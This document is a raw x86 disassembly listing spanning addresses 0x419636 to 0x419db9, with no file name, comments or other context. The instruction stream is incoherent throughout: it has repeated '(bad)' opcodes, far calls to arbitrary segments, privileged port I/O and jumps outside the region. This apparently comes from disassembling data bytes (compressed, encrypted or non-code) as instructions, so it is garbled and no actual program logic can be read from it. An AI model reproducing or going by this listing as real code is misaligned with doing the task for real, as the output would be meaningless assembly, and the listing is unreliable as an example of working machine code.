  419636:	add    BYTE PTR [esi],0xb8
  419639:	pop    ebx
  41963a:	pop    ebx
  41963b:	dec    ebp
  41963c:	adc    eax,esi
  41963e:	xor    BYTE PTR [esi+0x3861f2d6],cl
  419644:	xor    edi,DWORD PTR [esi]
  419646:	(bad)  
  419647:	xor    esp,DWORD PTR [edx+0x13]
  41964a:	pop    es
  41964b:	ins    BYTE PTR es:[edi],dx
  41964c:	and    dh,dh
  41964e:	std    
  41964f:	sbb    eax,0x9078a95f
  419654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419655:	mov    ds:0x98636575,eax
  41965a:	sbb    DWORD PTR [ebx],ebp
  41965c:	and    eax,esp
  41965e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41965f:	(bad)  
  419660:	sub    eax,0x52d316cd
  419665:	stc    
  419666:	std    
  419667:	mov    ebp,DWORD PTR [esi-0x53]
  41966a:	in     al,dx
  41966b:	fwait
  41966c:	loop   0x41967c
  41966e:	ja     0x4196e5
  419670:	pop    ecx
  419671:	jnp    0x419657
  419673:	xor    bl,al
  419675:	call   0x48d5:0x18b1e6bc
  41967c:	(bad)  
  41967d:	faddp  st(3),st
  41967f:	cwde   
  419680:	outs   dx,BYTE PTR ds:[esi]
  419681:	fistp  QWORD PTR [esi+0x36b45911]
  419687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419688:	les    esi,FWORD PTR [ebp-0x70]
  41968b:	xlat   BYTE PTR ds:[ebx]
  41968c:	dec    ebx
  41968d:	push   ebp
  41968e:	arpl   WORD PTR [esi+0x2a78212f],sp
  419694:	push   0x6eb5400
  419699:	jp     0x41964f
  41969b:	push   ecx
  41969c:	push   es
  41969d:	mov    bh,0xeb
  41969f:	(bad)  
  4196a0:	push   edx
  4196a1:	shr    bh,cl
  4196a3:	fwait
  4196a4:	mov    al,0x88
  4196a6:	jns    0x41967b
  4196a8:	fwait
  4196a9:	dec    ebx
  4196aa:	shl    DWORD PTR [edi+ebp*1],cl
  4196ad:	mov    esp,0x7fff87ad
  4196b2:	popf   
  4196b3:	repnz out 0xaf,al
  4196b6:	out    dx,eax
  4196b7:	jp     0x419718
  4196b9:	mov    ebp,0x3d9600ca
  4196be:	xchg   DWORD PTR [esi],edi
  4196c0:	pop    ds
  4196c1:	or     bh,BYTE PTR [esi]
  4196c3:	xor    al,0x12
  4196c5:	or     esp,DWORD PTR [edi+0x70]
  4196c8:	ja     0x419706
  4196ca:	jmp    0x4196e0
  4196cc:	inc    eax
  4196cd:	cs adc al,0x27
  4196d0:	inc    ebp
  4196d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196d2:	retf   
  4196d3:	inc    edi
  4196d4:	and    eax,0xc32fee99
  4196d9:	das    
  4196da:	repnz push es
  4196dc:	xchg   esi,eax
  4196dd:	jmp    0x41968b
  4196df:	outs   dx,BYTE PTR ds:[esi]
  4196e0:	(bad)  
  4196e1:	sbb    DWORD PTR [edi+0x46],eax
  4196e4:	push   0xffffffb6
  4196e6:	xor    al,0x6f
  4196e8:	jmp    0x63e7:0x4e95735a
  4196ef:	add    BYTE PTR [esi],bh
  4196f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f2:	out    dx,al
  4196f3:	xor    eax,0xb65f3f78
  4196f8:	adc    ch,BYTE PTR [ebx]
  4196fa:	and    bl,BYTE PTR [edx+0xc0d0c87]
  419700:	mov    ds:0xbf93ef6c,al
  419705:	or     cl,BYTE PTR es:[ecx]
  419708:	fdivr  DWORD PTR [edi-0x78]
  41970b:	add    esi,ebx
  41970d:	xchg   ecx,eax
  41970e:	push   esi
  41970f:	xor    BYTE PTR [ecx-0x57],cl
  419712:	and    eax,0xb1eaf6fa
  419717:	scas   al,BYTE PTR es:[edi]
  419718:	mov    ecx,0x931aaaa7
  41971d:	cmp    eax,0x5b9f50ac
  419722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419723:	pop    es
  419724:	dec    esi
  419725:	mov    ebx,DWORD PTR [esi+ecx*2+0x55d4e926]
  41972c:	dec    ebx
  41972d:	arpl   si,dx
  41972f:	stos   BYTE PTR es:[edi],al
  419730:	or     BYTE PTR [ecx],al
  419732:	sti    
  419733:	call   0x8c5c6e1e
  419738:	pop    edi
  419739:	cmc    
  41973a:	xchg   esi,eax
  41973b:	pop    ecx
  41973c:	(bad)  
  41973d:	iret   
  41973e:	sub    BYTE PTR [edx],bh
  419740:	and    al,BYTE PTR [ecx-0x75]
  419743:	xrelease mov BYTE PTR ds:0xff6f64e7,bl
  41974a:	mov    WORD PTR [edx-0x12],ds
  41974d:	pop    ds
  41974e:	add    eax,0x49fbadf8
  419753:	cmc    
  419754:	push   0x0
  419756:	sbb    esi,DWORD PTR [ebp-0x5ab4600e]
  41975c:	popf   
  41975d:	bswap  ebx
  41975f:	sub    DWORD PTR [edx+0x2b12c336],0x5c
  419766:	fwait
  419767:	push   cs
  419768:	mov    eax,0x50c98008
  41976d:	xor    BYTE PTR [esi-0x41c71c41],dh
  419773:	pop    ebx
  419774:	lods   eax,DWORD PTR ds:[esi]
  419775:	mov    ebx,0x59bb3fe8
  41977a:	lods   eax,DWORD PTR ds:[esi]
  41977b:	sbb    dh,BYTE PTR [eax]
  41977d:	xor    DWORD PTR [edi+esi*8-0x5c3e24d0],ebx
  419784:	aad    0x5c
  419786:	lea    edx,[eax+0x66]
  419789:	stos   BYTE PTR es:[edi],al
  41978a:	jbe    0x4197ad
  41978c:	push   0xb1fd97b4
  419791:	daa    
  419792:	add    DWORD PTR [ecx-0x3408e76],ebx
  419798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419799:	push   esi
  41979a:	inc    edx
  41979b:	je     0x419806
  41979d:	imul   esp,DWORD PTR gs:[eax-0x36],0x5c2be020
  4197a5:	sbb    esp,DWORD PTR [ebx-0x47]
  4197a8:	std    
  4197a9:	cwde   
  4197aa:	dec    esi
  4197ab:	mov    edi,0x72699629
  4197b0:	loop   0x41980a
  4197b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197b3:	sub    ah,dl
  4197b5:	in     al,dx
  4197b6:	clc    
  4197b7:	push   ds
  4197b8:	mov    bl,0xb2
  4197ba:	sub    DWORD PTR [edx+esi*4],edi
  4197bd:	mov    eax,0x389f361c
  4197c2:	dec    ebp
  4197c3:	adc    BYTE PTR [esi+edi*2-0x25800dab],dh
  4197ca:	inc    ebp
  4197cb:	xor    al,0x5e
  4197cd:	(bad)  
  4197cf:	rcr    eax,0xae
  4197d2:	aad    0x73
  4197d4:	mov    al,0x77
  4197d6:	cmc    
  4197d7:	lods   eax,DWORD PTR ds:[esi]
  4197d8:	jae    0x4197f5
  4197da:	xchg   ebp,eax
  4197db:	iret   
  4197dc:	call   0x6710:0xbd6b0e67
  4197e3:	pop    edi
  4197e4:	in     eax,dx
  4197e5:	push   0xd82a9134
  4197ea:	sbb    DWORD PTR [esi+ebx*4-0x27a80b89],edi
  4197f1:	dec    eax
  4197f2:	mov    dl,BYTE PTR [esi-0x3d]
  4197f5:	mov    esp,0x4d914a8e
  4197fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197fb:	mov    bh,0x7e
  4197fd:	sub    DWORD PTR [ecx+edx*2],eax
  419800:	jl     0x4197b0
  419802:	pop    ss
  419803:	adc    al,0x81
  419805:	or     eax,0x4990a786
  41980a:	jns    0x419795
  41980c:	lea    ebx,[esi+0xd]
  41980f:	sbb    BYTE PTR [ecx],bh
  419811:	lods   al,BYTE PTR ds:[esi]
  419812:	mov    ecx,0x2af50997
  419817:	outs   dx,DWORD PTR ds:[esi]
  419818:	pop    ss
  419819:	dec    esi
  41981a:	hlt    
  41981b:	mov    ch,0x20
  41981d:	js     0x419854
  41981f:	ret    0xd619
  419822:	jl     0x419800
  419824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419825:	dec    eax
  419826:	ficomp DWORD PTR [ecx-0x24d71d4]
  41982c:	fnstenv [esi*8-0x183e281c]
  419833:	adc    eax,0x94155b5
  419838:	in     eax,dx
  419839:	imul   edi,DWORD PTR [edi+0x37a6ab7d],0x333bca7e
  419843:	dec    edi
  419844:	les    esi,FWORD PTR [ebx+0x33]
  419847:	xchg   DWORD PTR [ecx+0x58768b7b],edx
  41984d:	mul    BYTE PTR [esi]
  41984f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419850:	clc    
  419851:	sahf   
  419852:	add    edx,DWORD PTR [edx]
  419854:	adc    DWORD PTR [edx+0x2],ebx
  419857:	clc    
  419858:	out    dx,al
  419859:	or     eax,0x712984a5
  41985e:	cmp    edx,DWORD PTR [ecx-0x9]
  419861:	ins    DWORD PTR es:[edi],dx
  419862:	retf   0x15ba
  419865:	sub    al,0x21
  419867:	sahf   
  419868:	call   0x88e7:0xf5e1b74
  41986f:	sbb    BYTE PTR ds:0x8b94445b,0x26
  419876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419877:	inc    ebp
  419878:	sbb    DWORD PTR [bx+si],edi
  41987b:	ror    BYTE PTR [edi+eax*2+0x3d],1
  41987f:	loopne 0x419843
  419881:	call   0xff00:0x886846bd
  419888:	or     dh,bh
  41988a:	out    dx,al
  41988b:	xor    eax,0x5a34f1b3
  419890:	sub    eax,0xe6fdb4f2
  419895:	or     al,0xcb
  419897:	sub    eax,0xb5c73964
  41989c:	jmp    DWORD PTR [ebp+0x6af8ac9b]
  4198a2:	sbb    al,0x28
  4198a4:	call   0x19e8a448
  4198a9:	test   al,0xef
  4198ab:	sahf   
  4198ac:	add    eax,ecx
  4198ae:	les    ebp,FWORD PTR [ebp-0x54]
  4198b1:	jne    0x419865
  4198b3:	repnz shl DWORD PTR [esp+eiz*8+0x26f2daaa],cl
  4198bb:	retf   0xa0cd
  4198be:	jmp    0x419885
  4198c0:	leave  
  4198c1:	xor    ecx,DWORD PTR [edx+eiz*4]
  4198c4:	stc    
  4198c5:	data16 (bad) 
  4198c8:	fisubr DWORD PTR [edi]
  4198ca:	out    dx,eax
  4198cb:	xchg   edi,edx
  4198cd:	jne    0x4198af
  4198cf:	xchg   edx,eax
  4198d0:	pop    edi
  4198d1:	push   0xffffffa5
  4198d3:	and    al,0x3a
  4198d5:	jo     0x419942
  4198d7:	sbb    al,0x34
  4198d9:	dec    ebx
  4198da:	div    BYTE PTR [eax]
  4198dc:	rcr    DWORD PTR ds:[edx+0x10],cl
  4198e0:	cmp    DWORD PTR [ebx+0x7d],esp
  4198e3:	retf   0x61a0
  4198e6:	dec    edx
  4198e7:	cmp    BYTE PTR [ebx-0x76],0xaa
  4198eb:	push   eax
  4198ec:	mov    gs:0x9300749f,eax
  4198f2:	aas    
  4198f3:	push   ds
  4198f4:	add    BYTE PTR [esp+ebp*1-0x587a1704],0xfd
  4198fc:	das    
  4198fd:	xchg   edi,eax
  4198fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198ff:	(bad)  
  419900:	int3   
  419901:	push   esp
  419902:	mov    bh,dh
  419904:	outs   dx,BYTE PTR ds:[esi]
  419905:	jnp    0x4198c0
  419907:	sbb    DWORD PTR [edx+0x30],0x6b5f116
  41990e:	leave  
  41990f:	xchg   esp,eax
  419910:	pop    es
  419911:	pop    edx
  419912:	mov    dl,0xde
  419914:	fnsave [edi]
  419916:	pop    es
  419917:	pop    ecx
  419918:	pushf  
  419919:	sahf   
  41991a:	stos   DWORD PTR es:[edi],eax
  41991b:	out    0xac,eax
  41991d:	fcom   DWORD PTR [edi-0x677c1863]
  419923:	(bad)  
  419924:	aam    0xa9
  419926:	(bad)  
  419927:	popa   
  419928:	getsec 
  41992a:	addr16 adc eax,0x30af2288
  419930:	mov    ?,WORD PTR [ebp+0x68]
  419933:	xchg   edx,eax
  419934:	pop    esp
  419935:	push   0x67
  419937:	sbb    bl,BYTE PTR [eax-0x15efbbcf]
  41993d:	test   DWORD PTR [edx+0x53],eax
  419940:	sbb    DWORD PTR [esi-0x5b00f501],0x54
  419947:	dec    eax
  419948:	cwde   
  419949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41994a:	jp     0x419914
  41994c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41994d:	in     al,0xbe
  41994f:	mov    eax,0x6ae58d2b
  419954:	fidiv  WORD PTR [edi-0x22e3435f]
  41995a:	mov    ebp,0x2b7a098c
  41995f:	inc    edi
  419960:	sub    cl,ch
  419962:	lock (bad) 
  419964:	int    0x3b
  419966:	retf   0x66ec
  419969:	mov    eax,ds:0x5e2eb1c6
  41996e:	push   esp
  41996f:	mov    ah,0xd1
  419971:	pop    es
  419972:	outs   dx,DWORD PTR ds:[esi]
  419973:	dec    esi
  419974:	inc    ebx
  419975:	push   0x30
  419977:	jnp    0x419977
  419979:	hlt    
  41997a:	bound  ecx,QWORD PTR [ecx-0x2d]
  41997d:	jmp    0xea71a2f5
  419982:	dec    ecx
  419983:	in     eax,dx
  419984:	mov    dl,BYTE PTR [esi]
  419986:	mov    ecx,0xee37e1d4
  41998b:	mov    ecx,0xc880368f
  419990:	clc    
  419991:	std    
  419992:	pushf  
  419993:	lods   eax,DWORD PTR ds:[esi]
  419994:	inc    eax
  419995:	mov    bh,0x6f
  419997:	mov    dh,0xf3
  419999:	xchg   ebp,eax
  41999a:	(bad)  
  41999b:	or     eax,0xbf9ab27c
  4199a0:	push   es
  4199a1:	(bad)  [ebp+0x72]
  4199a4:	push   0x60f4ae84
  4199a9:	mov    cl,0xc2
  4199ab:	es sahf 
  4199ad:	or     ch,ah
  4199af:	in     eax,0xbf
  4199b1:	ret    
  4199b2:	jnp    0x419953
  4199b4:	ret    0x28fe
  4199b7:	scas   al,BYTE PTR es:[edi]
  4199b8:	push   ss
  4199b9:	je     0x419944
  4199bb:	sub    BYTE PTR [eax+0x1],bl
  4199be:	adc    bl,BYTE PTR [ebx+0x423cabde]
  4199c4:	dec    ebp
  4199c5:	xor    al,0xcd
  4199c7:	lahf   
  4199c8:	(bad)  
  4199ca:	repz mov ds:0x83e86911,eax
  4199d0:	call   0x5531:0xc0522c43
  4199d7:	add    DWORD PTR [edx+0x73],0x167137d3
  4199de:	cmp    bh,BYTE PTR [bx]
  4199e1:	sub    al,BYTE PTR [edx+0x1a915be5]
  4199e7:	xchg   DWORD PTR [edi+0x12],edi
  4199ea:	repnz lds edi,FWORD PTR [ecx+ecx*4-0x17]
  4199ef:	and    BYTE PTR [edi+0x158193ff],cl
  4199f5:	mov    al,0x1f
  4199f7:	mov    edx,0xc4e62716
  4199fc:	ins    DWORD PTR es:[edi],dx
  4199fd:	sub    eax,0x5c24b2ce
  419a02:	mov    ebx,0xec04a47f
  419a07:	in     eax,0xe2
  419a09:	fstp   DWORD PTR [edi+0x6c]
  419a0c:	pop    ss
  419a0d:	int    0x10
  419a0f:	cdq    
  419a10:	and    BYTE PTR [edx+0x43acf882],0xbc
  419a17:	retf   0x86c0
  419a1a:	mov    bl,0xf2
  419a1c:	sbb    ebp,esi
  419a1e:	loop   0x4199ac
  419a20:	push   es
  419a21:	icebp  
  419a22:	xor    eax,0x3a434b4f
  419a27:	and    eax,0x99a8fadb
  419a2c:	or     DWORD PTR [eax+0xfe92b6],esp
  419a32:	add    eax,0xbbd3da21
  419a37:	lods   al,BYTE PTR ds:[esi]
  419a38:	dec    edx
  419a39:	cmp    DWORD PTR [esi+edi*8+0x6a64526c],esi
  419a40:	(bad)  
  419a41:	in     al,0x9c
  419a43:	gs fwait
  419a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a46:	mov    ch,0x2b
  419a48:	in     eax,0x69
  419a4a:	cwde   
  419a4b:	inc    esi
  419a4c:	popf   
  419a4d:	adc    BYTE PTR [ecx-0x1ae1d7a0],dh
  419a53:	sbb    ah,dl
  419a55:	test   esi,eax
  419a57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a58:	lods   al,BYTE PTR ds:[esi]
  419a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a5a:	in     eax,dx
  419a5b:	jae    0x419ab8
  419a5d:	dec    edx
  419a5e:	js     0x419ac2
  419a60:	dec    edx
  419a61:	mov    dh,BYTE PTR [eax-0x75]
  419a64:	mov    es,WORD PTR [ecx]
  419a66:	fs ins DWORD PTR es:[edi],dx
  419a68:	(bad)  
  419a69:	and    edi,ebp
  419a6b:	jl     0xabd399a6
  419a71:	inc    esi
  419a72:	aad    0x5b
  419a74:	pop    edx
  419a75:	imul   ebp,ebx,0xfffffff1
  419a78:	pushf  
  419a79:	aam    0x11
  419a7b:	sahf   
  419a7c:	sub    BYTE PTR [esi+0x1dd0715f],bl
  419a82:	pusha  
  419a83:	or     eax,0xd053d13d
  419a88:	push   eax
  419a89:	xchg   ebp,eax
  419a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a8b:	in     eax,0x7c
  419a8d:	jecxz  0x419af2
  419a8f:	lods   al,BYTE PTR ds:[esi]
  419a90:	loope  0x419ae8
  419a92:	lods   al,BYTE PTR ds:[esi]
  419a93:	and    al,0x2a
  419a95:	dec    eax
  419a96:	mov    cl,0x10
  419a98:	test   al,0x79
  419a9a:	inc    esp
  419a9b:	xchg   al,cl
  419a9d:	mov    eax,ds:0xc6955d31
  419aa2:	dec    ebx
  419aa4:	mov    ebx,0x3f0a3ce2
  419aa9:	out    0xfd,eax
  419aab:	and    BYTE PTR [esi],al
  419aad:	cld    
  419aae:	mov    bl,0x9
  419ab0:	stos   DWORD PTR es:[edi],eax
  419ab1:	fiadd  WORD PTR [esi-0x1a]
  419ab4:	xsaveopt [esi]
  419ab7:	pop    ss
  419ab8:	inc    esi
  419ab9:	xchg   edx,eax
  419aba:	cwde   
  419abb:	pushf  
  419abc:	push   edx
  419abd:	pop    es
  419abe:	cdq    
  419abf:	mov    ebp,0xb24ebc58
  419ac4:	lods   al,BYTE PTR ds:[esi]
  419ac5:	jbe    0x419a77
  419ac7:	das    
  419ac8:	dec    edx
  419ac9:	xor    al,0xab
  419acb:	in     eax,0xc9
  419acd:	rcr    DWORD PTR [ebx+0x636d2c47],cl
  419ad3:	test   al,0xa9
  419ad5:	shr    bh,0x5e
  419ad8:	dec    ebp
  419ad9:	test   al,0x30
  419adb:	inc    ebx
  419adc:	xor    BYTE PTR [ebp+0x4e],ch
  419adf:	jg     0x419a62
  419ae1:	push   es
  419ae2:	jbe    0x419ac9
  419ae4:	sub    bh,BYTE PTR [edx+0x2dc1a6ef]
  419aea:	test   bh,al
  419aec:	mov    bl,0x26
  419aee:	push   ebp
  419aef:	fsub   DWORD PTR [esi+0x2dbf7ab0]
  419af5:	call   0xa3d6:0x71d0c657
  419afc:	out    dx,eax
  419afd:	sub    ebx,DWORD PTR [edi]
  419aff:	mov    dh,0x60
  419b01:	es xor edi,eax
  419b04:	sub    al,0xb6
  419b06:	jne    0x419b45
  419b08:	fdivr  st,st(3)
  419b0a:	(bad)
  419b0d:	dec    eax
  419b0e:	push   edi
  419b0f:	pushf  
  419b10:	xchg   ebp,ebx
  419b12:	dec    eax
  419b13:	pop    esi
  419b14:	xor    edx,DWORD PTR [esi*2+0x5b5e36a6]
  419b1b:	xor    edi,DWORD PTR [ebx-0x282e665e]
  419b21:	xchg   esp,eax
  419b22:	jae    0x419ab2
  419b24:	ficom  WORD PTR [eax-0x347f4fe3]
  419b2a:	mov    es,WORD PTR [edi]
  419b2c:	aas    
  419b2d:	shl    ah,0xfb
  419b30:	loopne 0x419b09
  419b32:	(bad)  
  419b33:	cmp    edi,DWORD PTR [edx]
  419b35:	jg     0x419adb
  419b37:	xor    ebx,DWORD PTR [ebx+esi*8-0x7d]
  419b3b:	loop   0x419aff
  419b3d:	(bad)  
  419b3e:	sub    DWORD PTR [edi-0x13],eax
  419b41:	mov    ebx,0x291a83b6
  419b46:	mov    bl,0x67
  419b48:	and    al,0xf
  419b4a:	cmp    eax,0x4f8b63ac
  419b4f:	test   al,0xfd
  419b51:	dec    esp
  419b52:	pop    es
  419b53:	pop    ebp
  419b54:	mov    ebp,0xe822edfa
  419b59:	push   ds
  419b5a:	mov    BYTE PTR [ebx+0x6e21ee74],ah
  419b60:	std    
  419b61:	jnp    0x419b9b
  419b63:	call   0xc9f6dbe7
  419b68:	popa   
  419b69:	adc    al,0xd9
  419b6b:	popa   
  419b6c:	rcl    DWORD PTR [edi+0x4a],cl
  419b6f:	fadd   QWORD PTR [edi+0x48]
  419b72:	fs mov ah,0x9e
  419b75:	cdq    
  419b76:	sbb    al,0x2b
  419b78:	mov    ch,0xfe
  419b7a:	stos   BYTE PTR es:[edi],al
  419b7b:	xchg   edx,eax
  419b7c:	mov    eax,ds:0x7ca3cd54
  419b81:	mov    ds:0xa913e4,al
  419b86:	mov    edi,0x98b113b2
  419b8b:	js     0x419bc4
  419b8d:	test   BYTE PTR [edx+0x3cf189d3],0x38
  419b94:	inc    edx
  419b95:	scas   eax,DWORD PTR es:[edi]
  419b96:	and    BYTE PTR es:[ecx+0x34],0x71
  419b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b9c:	sar    al,cl
  419b9e:	(bad)  
  419b9f:	and    dh,dh
  419ba1:	ret    
  419ba2:	inc    edx
  419ba3:	mov    ebx,0xf9ef8804
  419ba8:	stos   DWORD PTR es:[edi],eax
  419ba9:	push   edi
  419baa:	jne    0x419c13
  419bac:	arpl   WORD PTR [edi+eax*8],sp
  419baf:	sahf   
  419bb0:	mov    dh,0xbf
  419bb2:	out    dx,al
  419bb3:	pop    ebp
  419bb4:	mov    dh,0x8e
  419bb6:	(bad)  
  419bb7:	nop
  419bb8:	mov    edi,0x338617f4
  419bbd:	sub    al,BYTE PTR [edi+0x67]
  419bc0:	shl    BYTE PTR [edi+0x3c],1
  419bc3:	outs   dx,BYTE PTR ds:[esi]
  419bc4:	je     0x419c42
  419bc6:	jg     0x419b49
  419bc8:	inc    ebp
  419bc9:	jg     0x419bc3
  419bcb:	loopne 0x419bf3
  419bcd:	pop    esi
  419bce:	in     eax,0xab
  419bd0:	icebp  
  419bd1:	iret   
  419bd2:	pop    ecx
  419bd3:	inc    eax
  419bd4:	loope  0x419b76
  419bd6:	in     al,dx
  419bd7:	xchg   BYTE PTR [edx+0x29],ch
  419bda:	cli    
  419bdb:	dec    eax
  419bdc:	stc    
  419bdd:	and    BYTE PTR [ebp+0x759ce649],bl
  419be3:	(bad)  
  419be4:	jmp    0x419c19
  419be6:	adc    BYTE PTR [ebx+esi*1],0xe8
  419bea:	xor    ebp,0xffffffc2
  419bed:	clc    
  419bee:	imul   edx,ebx,0x76069de6
  419bf4:	sub    bl,ch
  419bf6:	mov    al,ds:0x99367c20
  419bfb:	inc    eax
  419bfc:	adc    ch,BYTE PTR [edi+0x78]
  419bff:	or     BYTE PTR [eax-0x7a77975b],0x78
  419c06:	sbb    BYTE PTR ds:0xb26192b3,bl
  419c0c:	in     eax,0x44
  419c0e:	out    0x3a,eax
  419c10:	cmp    bl,dh
  419c12:	outs   dx,DWORD PTR ds:[esi]
  419c13:	gs jge 0x419c6f
  419c16:	pop    edi
  419c17:	mov    ds:0x255f2e62,eax
  419c1c:	push   eax
  419c1d:	push   edx
  419c1e:	std    
  419c1f:	push   edi
  419c20:	pop    esi
  419c21:	sbb    edi,edx
  419c23:	push   ss
  419c24:	scas   eax,DWORD PTR es:[edi]
  419c25:	imul   edi,DWORD PTR [ebp+0x6a],0xe21b6572
  419c2c:	sar    DWORD PTR [edi],cl
  419c2e:	jno    0x419c19
  419c30:	dec    eax
  419c31:	stc    
  419c32:	adc    eax,0x20c77fd6
  419c37:	stos   BYTE PTR es:[edi],al
  419c38:	mov    DWORD PTR [ebx-0xdfc80d6],edx
  419c3e:	js     0x419c71
  419c40:	push   ss
  419c41:	push   edi
  419c42:	rol    BYTE PTR [edx-0x6df83417],0xa0
  419c49:	xchg   edi,eax
  419c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c4b:	repnz adc bh,BYTE PTR [edi-0x1c]
  419c4f:	jnp    0x419c76
  419c51:	add    eax,0x6af8cec3
  419c56:	stc    
  419c57:	sbb    eax,0x461e54b1
  419c5c:	int3   
  419c5d:	jl     0x419c9c
  419c5f:	(bad)  [ebp-0x5f]
  419c62:	sub    bh,dl
  419c64:	mov    edi,DWORD PTR [edx+0x2]
  419c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c68:	push   edx
  419c69:	mov    ah,0xff
  419c6b:	xor    DWORD PTR [eax-0x8],0x4bda90e6
  419c72:	or     al,0x31
  419c74:	jmp    0xf139295c
  419c79:	inc    ebx
  419c7a:	pop    ecx
  419c7b:	jge    0x419cee
  419c7d:	cmc    
  419c7e:	dec    ecx
  419c7f:	add    BYTE PTR [edi],ah
  419c81:	dec    ebx
  419c82:	add    al,0xf1
  419c84:	ds imul eax,edx,0xface6703
  419c8b:	mov    bh,0xef
  419c8d:	dec    esp
  419c8e:	push   ebx
  419c8f:	mov    dl,BYTE PTR [eax-0x2]
  419c92:	xchg   edx,eax
  419c93:	jo     0x419c83
  419c95:	jnp    0x419ccd
  419c97:	cli    
  419c98:	test   DWORD PTR [ebp+0x684ca8b3],eax
  419c9e:	ret    
  419c9f:	mov    ah,0xa0
  419ca1:	shl    BYTE PTR [eax+ecx*2-0x18],cl
  419ca5:	push   es
  419ca6:	push   ds
  419ca7:	rol    ebx,0x82
  419caa:	jmp    0x419c7a
  419cac:	inc    ebp
  419cad:	mov    ebx,0x6e21aed8
  419cb2:	adc    al,0x24
  419cb4:	push   es
  419cb5:	shl    BYTE PTR [edx+0x3dfee832],cl
  419cbb:	jno    0x419d12
  419cbd:	scas   al,BYTE PTR es:[edi]
  419cbe:	std    
  419cbf:	(bad)  
  419cc1:	pop    eax
  419cc2:	std    
  419cc3:	or     BYTE PTR ds:0xa182fe42,0x7e
  419cca:	mov    bh,0x22
  419ccc:	sbb    al,0x4a
  419cce:	push   ebp
  419ccf:	dec    ebx
  419cd0:	mov    bl,BYTE PTR [edx]
  419cd2:	lea    esi,[edi]
  419cd4:	in     eax,0xf5
  419cd6:	cmp    esp,ebp
  419cd8:	mov    ch,0x51
  419cda:	dec    ecx
  419cdb:	and    ecx,edx
  419cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cde:	rol    BYTE PTR [eax-0x50],1
  419ce1:	aaa    
  419ce2:	stos   DWORD PTR es:[edi],eax
  419ce3:	mov    ds:0xf0bc6130,al
  419ce8:	stos   BYTE PTR es:[edi],al
  419ce9:	jl     0x419cae
  419ceb:	ins    BYTE PTR es:[edi],dx
  419cec:	and    dh,BYTE PTR [ecx]
  419cee:	or     edi,DWORD PTR [edx+eax*8]
  419cf1:	lods   al,BYTE PTR ds:[esi]
  419cf2:	xor    al,0x4
  419cf4:	mov    BYTE PTR [edi+0x7c1a7606],ah
  419cfa:	mov    DWORD PTR [ebp+0x70],ebx
  419cfd:	jmp    DWORD PTR [bx+si+0x53fc]
  419d02:	rcl    al,0x5b
  419d05:	imul   edi,DWORD PTR [eax],0x6d
  419d08:	popa   
  419d09:	cli    
  419d0a:	xchg   esp,eax
  419d0b:	cdq    
  419d0c:	and    eax,0x4dfceaa1
  419d11:	sbb    ch,ah
  419d13:	adc    ah,BYTE PTR [eax+0x3cb55238]
  419d19:	call   0x90366579
  419d1e:	retf   
  419d1f:	cmp    ebx,eax
  419d21:	xor    al,0x70
  419d23:	rcr    esp,0xd0
  419d26:	repnz nop
  419d28:	nop
  419d29:	(bad)
  419d2d:	mov    esp,0x24747cee
  419d32:	mov    BYTE PTR [edi+0xe],ah
  419d35:	clc    
  419d36:	call   0x5659:0x3214f1e4
  419d3d:	cmp    BYTE PTR [ebx-0x5c8c5096],bh
  419d43:	sub    eax,0x77529c3b
  419d48:	push   ss
  419d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d4a:	out    0xda,al
  419d4c:	gs ret 0x76e9
  419d50:	aad    0x75
  419d52:	ja     0x419d7d
  419d54:	mov    ds:0xfaeb44e9,al
  419d59:	inc    ebx
  419d5a:	jne    0x419dd3
  419d5c:	add    al,BYTE PTR [esi+0x7f]
  419d5f:	js     0x419da1
  419d61:	and    al,BYTE PTR [ecx-0x4c3fe173]
  419d67:	in     al,dx
  419d68:	inc    ebp
  419d69:	icebp  
  419d6a:	rcr    ebp,cl
  419d6c:	xor    esi,DWORD PTR [eax-0x77]
  419d6f:	mov    ebp,0xc32911d
  419d74:	cli    
  419d75:	adc    eax,0x5fbe5736
  419d7a:	ins    BYTE PTR es:[edi],dx
  419d7b:	mov    esi,0xb8a9906e
  419d80:	stos   BYTE PTR es:[edi],al
  419d81:	ds fdivp st(6),st
  419d84:	cwde   
  419d85:	jmp    0x290d36a0
  419d8a:	pop    esp
  419d8b:	scas   al,BYTE PTR es:[edi]
  419d8c:	je     0x419dc3
  419d8e:	adc    eax,0x7f624
  419d93:	jo     0x419d71
  419d95:	mov    eax,ds:0x3cf6b03a
  419d9a:	inc    esp
  419d9b:	mov    dl,0xdc
  419d9d:	add    bl,BYTE PTR [esi-0x3f]
  419da0:	dec    esi
  419da1:	aad    0x25
  419da3:	mov    BYTE PTR [esi],bl
  419da5:	xor    al,0x31
  419da7:	test   BYTE PTR [ebx+0x3f],dh
  419daa:	out    dx,eax
  419dab:	xor    BYTE PTR [edi],al
  419dad:	add    ah,ch
  419daf:	pop    ds
  419db0:	inc    ecx
  419db1:	ja     0x419db5
  419db3:	push   ds
  419db4:	dec    esi
  419db5:	je     0x419d85
  419db7:	sub    ch,al
  419db9:	mov    ecx,0xdadf61d0
